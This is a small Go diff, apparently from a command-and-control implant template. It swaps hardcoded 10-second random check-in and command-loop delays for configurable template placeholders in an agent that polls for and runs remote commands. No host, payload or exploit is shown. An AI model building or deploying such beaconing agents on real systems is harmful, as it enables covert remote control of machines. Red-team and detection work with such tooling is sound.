@@ -63,7 +63,7 @@ func (a *agent) Checkin() {
 			/*{{.Checkin}}*/
 
 			tick.Stop()
-			randyboi := rand.Intn(10000) //10 seconds variance
+			randyboi := rand.Intn( {{.CheckinMaxTime}} ) //10 seconds variance
 			tick = time.NewTicker(time.Duration(randyboi) * time.Millisecond)
 		}
 
@@ -107,7 +107,7 @@ func main() {
 		if a.GetCommand() {
 			a.ExecCommand()
 		}
-		v := rand.Intn(10000)
+		v := rand.Intn( {{.CmdExecTimeout}} )
 		time.Sleep(time.Millisecond * time.Duration(v))
 	}
 }
